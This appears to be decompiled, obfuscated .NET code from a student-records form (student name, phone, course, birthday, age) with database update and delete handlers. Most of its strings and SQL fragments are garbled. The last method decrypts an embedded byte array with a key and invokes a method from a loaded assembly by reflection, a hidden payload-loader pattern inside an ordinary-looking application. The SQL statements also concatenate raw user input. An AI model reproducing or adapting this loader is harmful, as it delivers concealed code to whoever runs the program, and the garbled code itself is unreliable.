			NewLateBinding.LateSet(yrcmb, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
		}
	}

	private void Cm6k7M(object sender, EventArgs e)
	{
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Invalid comparison between Unknown and I4
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { "svwet547658ylmnfd" }, (string[])null, (Type[])null);
		try
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delretsewtdentid='", NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"asdfaae3"));
			COMMAND = RuntimeHelpers.GetObjectValue(new object());
			RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(COMMAND, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			MsgBoxResult val = Interaction.MsgBox((object)"vxcer5", (MsgBoxStyle)1, (object)"g54y45y");
			if ((int)val == 1)
			{
				object obj = NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null);
				object[] array = new object[1];
				object object_ = q1N7Ar_0.object_3;
				object[] array2 = new object[1];
				object obj2 = (array2[0] = 0);
				array[0] = NewLateBinding.LateGet(object_, (Type)null, "SelectedItems", array2, (string[])null, (Type[])null, (bool[])null);
				object obj3 = array;
				bool[] obj4 = new bool[1] { true };
				object obj5 = obj4;
				NewLateBinding.LateCall(obj, (Type)null, "Remove", array, (string[])null, (Type[])null, obj4, true);
				if (((bool[])obj5)[0])
				{
					NewLateBinding.LateSetComplex(object_, (Type)null, "SelectedItems", new object[2]
					{
						obj2,
						(obj3 as object[])[0]
					}, (string[])null, (Type[])null, true, false);
				}
				MessageBox.Show("zvr54", "Deledfwtted");
				NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				q0BAd4();
				w9NXp5();
			}
			else
			{
				q0BAd4();
				NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			}
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			_Exception val2 = (_Exception)(object)ex;
			MessageBox.Show((val2 as Exception).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void t7C0Bn(object sender, EventArgs e)
	{
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Invalid comparison between Unknown and I4
		//IL_0575: Unknown result type (might be due to invalid IL or missing references)
		//IL_0755: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { "vjnfdhg8w" }, (string[])null, (Type[])null);
		try
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"vn;uhgw3", NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"cm[fu3"), NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"averge"), NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"',studentcadfettourse='"), NewLateBinding.LateGet(q1N7Ar_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"',adgeeg='"), NewLateBinding.LateGet(yrcmb, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"',li8='"), NewLateBinding.LateGet(studentbirthday, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"',vtry='"), NewLateBinding.LateGet(q1N7Ar_0.object_9, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' hggfk k='"), NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			COMMAND = RuntimeHelpers.GetObjectValue(new object());
			RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(COMMAND, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			MsgBoxResult val = Interaction.MsgBox((object)"oaw32", (MsgBoxStyle)4, (object)"Upsfewew3date");
			if ((int)val == 6)
			{
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(yrcmb, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(studentbirthday, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_9, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				MessageBox.Show("svd5yy5", "Ushkyo5cpdated");
				q0BAd4();
				NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(yrcmb, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
				w9NXp5();
				NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			}
			else
			{
				q0BAd4();
				NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateCall(q1N7Ar_0.object_8, (Type)null, "ResetText", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(yrcmb, (Type)null, "ResetText", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				w9NXp5();
			}
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			ISerializable serializable = ex;
			MessageBox.Show((serializable as Exception).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void Wa4b3B(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("zvdiuig85", "IDjici78weNumber");
		}
	}

	private void w5JTp0(object sender, KeyPressEventArgs e)
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectGreaterEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)11, false) && e.get_KeyChar() != '\b')
		{
			e.set_Handled(true);
			MessageBox.Show("Phone Number should not be more than 11 numbers", "Phone Number");
		}
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("This field will accept numbers only", "Phone Number");
		}
	}

	private void j5XEq6(object sender, EventArgs e)
	{
		//IL_0487: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { "aoviow8e" }, (string[])null, (Type[])null);
		object objectValue2 = RuntimeHelpers.GetObjectValue(new object());
		object obj = NewLateBinding.LateGet(objectValue2, (Type)null, "Parameters", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] obj2 = new object[2] { "svd jruy894", null };
		object mySqlDbType = MySqlDbType;
		obj2[1] = NewLateBinding.LateGet(mySqlDbType, (Type)null, "Int64", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array = obj2;
		bool[] obj3 = new bool[2] { false, true };
		Array array2 = obj3;
		object obj4 = NewLateBinding.LateGet(obj, (Type)null, "Add", obj2, (string[])null, (Type[])null, obj3);
		if ((array2 as bool[])[1])
		{
			NewLateBinding.LateSetComplex(mySqlDbType, (Type)null, "Int64", new object[1] { (array as object[])[1] }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateSetComplex(obj4, (Type)null, "Value", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue4 = default(object);
		object obj5 = default(object);
		if (ForLoopControl.ForLoopInitObj(objectValue4, (object)0, Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1), (object)1, ref obj5, ref objectValue4))
		{
			do
			{
				object object_ = q1N7Ar_0.object_3;
				object[] obj6 = new object[1] { objectValue4 };
				array = obj6;
				bool[] obj7 = new bool[1] { true };
				array2 = obj7;
				object obj8 = NewLateBinding.LateGet(object_, (Type)null, "Items", obj6, (string[])null, (Type[])null, obj7);
				if ((array2 as bool[])[0])
				{
					objectValue4 = RuntimeHelpers.GetObjectValue(((object[])array)[0]);
				}
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(obj8, (Type)null, "SubItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), false))
				{
					object object_2 = q1N7Ar_0.object_3;
					object[] obj9 = new object[1] { objectValue4 };
					array = obj9;
					bool[] obj10 = new bool[1] { true };
					array2 = obj10;
					object obj11 = NewLateBinding.LateGet(object_2, (Type)null, "Items", obj9, (string[])null, (Type[])null, obj10);
					if (((bool[])array2)[0])
					{
						objectValue4 = RuntimeHelpers.GetObjectValue((array as object[])[0]);
					}
					NewLateBinding.LateSetComplex(obj11, (Type)null, "Selected", new object[1] { true }, (string[])null, (Type[])null, false, true);
				}
			}
			while (ForLoopControl.ForNextCheckObj(objectValue4, obj5, ref objectValue4));
		}
		if (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue3, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
		{
			NewLateBinding.LateSet(studentname, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 1 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_7, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 2 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 3 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(yrcmb, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 4 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(studentbirthday, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 5 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_9, (Type)null, "Text", new object[1] { NewLateBinding.LateIndexGet(objectValue3, new object[1] { 6 }, (string[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		}
		else
		{
			Interaction.MsgBox((object)"zvsddjhgew42", (MsgBoxStyle)64, (object)"ntyy");
		}
		NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Fy52Mj(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
		{
			NewLateBinding.LateSet(q1N7Ar_0.object_6, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(studentname, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_7, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(yrcmb, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(studentbirthday, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_9, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
		}
		NewLateBinding.LateCall(q1N7Ar_0.object_3, (Type)null, "Focus", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(q1N7Ar_0.object_3, (Type)null, "FullRowSelect", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		w9NXp5();
		NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
	}

	private void Po94Wp(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		if ((int)Interaction.MsgBox((object)"xv cjhgr4", (MsgBoxStyle)36, (object)"zce") == 6)
		{
			NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
			Do9s0C();
			NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		}
		else
		{
			q0BAd4();
			w9NXp5();
		}
	}

	private void w2F8Hm(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("nvjhgy44", "vrt5");
		}
	}

	private void Da7r9E(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsLetter(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("xcbhmta", "Studqagenewame");
		}
	}

	private void a1J6Sy(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(studentbirthday, (Type)null, "CustomFormat", new object[1] { "yyyy-MM-dd" }, (string[])null, (Type[])null);
		DateTime dateTime = new DateTime(1, 1, 1);
		DateTime dateTime2 = Conversions.ToDate(NewLateBinding.LateGet(studentbirthday, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = now - dateTime2;
		int num = checked((dateTime + timeSpan).Year - 1);
		NewLateBinding.LateSet(q1N7Ar_0.object_9, (Type)null, "Text", new object[1] { num.ToString() }, (string[])null, (Type[])null);
	}

	internal static void j4GWw8(object Nj50Cp, byte[] Zt6b0K, int g2QEd0)
	{
		checked
		{
			object obj = new byte[Nw9r7H.Data.Length - 1 + 1];
			int num = Nw9r7H.Data.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + Cy89Fz.r7RHs1(g2QEd0, Zt6b0K.Length, null, null, 1);
				int num3 = num2 & g2QEd0;
				int num4 = Cy89Fz.r7RHs1(i, Zt6b0K.Length, null, null, 1);
				int num5 = Zt6b0K[num4];
				int num6 = Cy89Fz.r7RHs1(0, 0, num5, num3, 2);
				int num7 = Nw9r7H.Data[i];
				(obj as byte[])[i] = (byte)Cy89Fz.r7RHs1(0, 0, num7, num6, 2);
			}
			object obj2 = new List<string>();
			(obj2 as List<string>).Add("vbcry");
			((List<string>)obj2).Add("jkppo[");
			(obj2 as List<string>).Add("cajk");
			object objectValue = RuntimeHelpers.GetObjectValue(Dq6e2L.p2AXy3(RuntimeHelpers.GetObjectValue(new object()), (byte[])obj));
			if (objectValue == null)
			{
				IReflectableType reflectableType = (TypeInfo)((Assembly)Nw9r7H.Ass).GetExportedTypes()[Nw9r7H.TNum - 27];
				if (reflectableType is TypeInfo)
				{
					NewLateBinding.LateCall((object)((TypeInfo)reflectableType).GetMethods()[0], (Type)null, "Invoke", new object[2]
					{
						null,
						new object[0]
					}, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
		}
	}
}
